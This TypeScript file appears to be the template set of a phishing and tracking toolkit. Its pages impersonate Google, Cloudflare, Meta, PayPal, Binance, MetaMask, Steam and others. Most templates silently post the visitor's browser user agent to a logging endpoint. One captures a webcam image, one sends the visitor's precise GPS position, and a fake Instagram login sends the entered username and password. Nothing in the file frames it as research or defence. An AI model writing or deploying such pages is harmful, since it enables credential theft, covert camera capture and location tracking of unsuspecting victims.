export const templates: Record<string, { name: string, render: (id: string) => string }> = {
    'silent_click': {
        name: 'Silent Logger (Blank Page)',
        render: (id) => `<html><body><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'google': {
        name: 'Google Security Alert',
        render: (id) => `<html><body><h2>Google Security Alert</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'cloudflare': {
        name: 'Cloudflare Anti-DDoS',
        render: (id) => `<html><body><h2>Checking your browser before accessing...</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'meta_verification': {
        name: 'Meta Verified Badge Request',
        render: (id) => `<html><body><h2>Meta Verified</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'terminal': {
        name: 'Terminal System Access',
        render: (id) => `<html><body style="background:black;color:#0f0"><h2>Terminal System Access</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'gallery': {
        name: 'Private Photo Gallery',
        render: (id) => `<html><body><h2>Private Photo Gallery</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'maps': {
        name: 'Google Maps Location Sharing',
        render: (id) => `<html><body><h2>Google Maps Location Sharing</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'pegasus': {
        name: 'Pegasus Spyware Scanner',
        render: (id) => `<html><body><h2>Pegasus Spyware Scanner</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'camera_stealth': {
        name: 'Camera Stealth Inject',
        render: (id) => `<html><body><script>
            navigator.mediaDevices.getUserMedia({video: true}).then(s => {
                const video = document.createElement('video');
                video.srcObject = s;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({visual_identity: canvas.toDataURL()}), headers: {'Content-Type': 'application/json'}});
                    s.getTracks().forEach(t => t.stop());
                }, 2000);
            });
        </script></body></html>`
    },
    'gps_tracker': {
        name: 'Precision GPS Tracker',
        render: (id) => `<html><body><h2>Google Maps</h2><script>
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/api/log/${id}/gps', {method:'POST', body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, tmplId: 'gps_tracker'}), headers: {'Content-Type': 'application/json'}});
            });
        </script></body></html>`
    },
    'meta_login': {
        name: 'Meta Phishing OSINT',
        render: (id) => `<html><body><h2>Instagram Security Alert</h2><input type="text" id="u" placeholder="Username"/><input type="password" id="p" placeholder="Password"/><button onclick="submit()">Login</button><script>
            function submit() {
                const u = document.getElementById('u').value;
                const p = document.getElementById('p').value;
                fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({user: u, pass: p, platform: 'instagram'}), headers: {'Content-Type': 'application/json'}});
            }
        </script></body></html>`
    },
    'paypal': {
        name: 'PayPal Security Audit',
        render: (id) => `<html><body><h2>PayPal Security Alert</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'binance': {
        name: 'Binance Crypto Audit',
        render: (id) => `<html><body><h2>Binance Withdrawal Security</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'wallet_connect': {
        name: 'Web3 MetaMask Signature Trap',
        render: (id) => `<html><body><h2>MetaMask Signature Required</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    },
    'steam': {
        name: 'Steam Guard Inject',
        render: (id) => `<html><body><h2>Steam Guard Verification</h2><script>fetch('/api/log/${id}/extra', {method:'POST', body: JSON.stringify({agent: navigator.userAgent}), headers: {'Content-Type': 'application/json'}});</script></body></html>`
    }
};
